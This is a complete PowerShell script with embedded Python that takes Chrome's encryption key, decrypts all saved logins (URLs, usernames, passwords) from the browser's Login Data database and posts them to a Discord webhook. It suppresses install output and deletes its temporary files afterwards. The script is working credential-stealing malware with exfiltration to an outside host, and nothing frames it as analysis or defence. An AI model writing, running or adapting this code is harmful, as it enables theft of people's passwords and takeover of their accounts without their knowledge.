$ErrorActionPreference = 'Stop'
$webhook = "YOUR_DISCORD_WEBHOOK_URL"

# Check Python
try { python --version >$null 2>&1 } catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 
}

# Install requirements
python -m pip install --upgrade pip >$null 2>&1
python -m pip install pycryptodome pypiwin32 requests >$null 2>&1

# Minimal Python extraction script
$pythonCode = @'
import os, json, sqlite3, base64, win32crypt
from Crypto.Cipher import AES
import shutil, uuid

def decrypt(password, key):
    try:
        iv, password = password[3:15], password[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def get_passwords():
    try:
        db_file = f"chrome_{uuid.uuid4().hex}.db"
        with open(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Local State"),"r") as f:
            key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
        
        shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","default","Login Data"), db_file)
        db = sqlite3.connect(db_file)
        results = [{"url":r[0],"username":r[1],"password":decrypt(r[2],key)} for r in db.cursor().execute("SELECT origin_url,username_value,password_value FROM logins") if r[1] or r[2]]
        return json.dumps(results)
    except Exception as e:
        return json.dumps({"error":str(e)})
    finally:
        try: os.remove(db_file)
        except: pass

print(get_passwords())
'@

# Execute and send to Discord
$tempFile = "$env:TEMP\pw_extract.py"
try {
    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
    $results = python $tempFile | Out-String
    
    # Prepare Discord payload
    $discordData = @{
        content = "🔑 Chrome Password Extraction Results"
        embeds = @(
            @{
                title = "Decrypted Credentials"
                description = "```json`n$results`n```"
                color = 65280 # Green
            }
        )
    }
    
    # Send to Discord
    Invoke-RestMethod -Uri $webhook -Method Post -Body ($discordData | ConvertTo-Json) -ContentType "application/json"
}
finally {
    Remove-Item $tempFile -ErrorAction SilentlyContinue
}
